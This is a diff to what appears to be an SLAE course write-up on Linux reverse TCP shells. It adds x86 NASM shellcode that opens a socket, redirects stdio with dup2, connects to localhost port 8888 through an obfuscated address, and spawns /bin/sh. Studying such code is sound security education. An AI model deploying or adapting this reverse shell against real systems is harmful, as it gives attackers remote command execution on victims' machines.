@@ -128,7 +128,49 @@ Also it is important to know how the system calls work in Linux. As stated in th
 <img src="https://github.com/ricardojoserf/slae/blob/master/a2_Shell_Reverse_Tcp/images/wrapper/6.png?raw=true"><br>
 <br>
 Knowing this and the values from the Libemu's output, it is possible to write the nasm code.<br>
+
+<br><code style="background-color: #eee; border: 1px solid #999; display: block; padding: 20px; font-size: 110%; color: black; word-wrap: break-word;">global _start<br>
 <br>
+section .text<br>
+_start:<br>
+xor eax, eax<br>
+mov ax, 0x167<br>
+xor ebx, ebx<br>
+mov bl, 2<br>
+xor ecx, ecx<br>
+mov cl, 1<br>
+xor edx, edx<br>
+int 0x80<br>
+mov ebx, eax<br>
+mov cl, 3<br>
+int 0x80<br>
+bucle:<br>
+xor eax, eax<br>
+mov al, 0x3f<br>
+int 0x80<br>
+dec ecx<br>
+jns bucle<br>
+mov ax, 0x16a<br>
+xor edi, edi<br>
+mov edi, 0x12111190<br>
+sub edi, 0x11111111<br>
+push edi<br>
+push word 0xb822<br>
+push word 2<br>
+mov ecx, esp<br>
+mov dl, 0x66<br>
+int 0x80<br>
+push eax<br>
+push 0x68732f2f<br>
+push 0x6e69622f<br>
+mov ebx, esp<br>
+push eax<br>
+mov edx, esp<br>
+push ebx<br>
+mov ecx, esp<br>
+mov al, 11<br>
+int 0x80<br>
+</code>
 <h2> Creating the Python wrapper</h2><br>
 Get the shellcode changing the "\" to "\\":<br>
 <br>
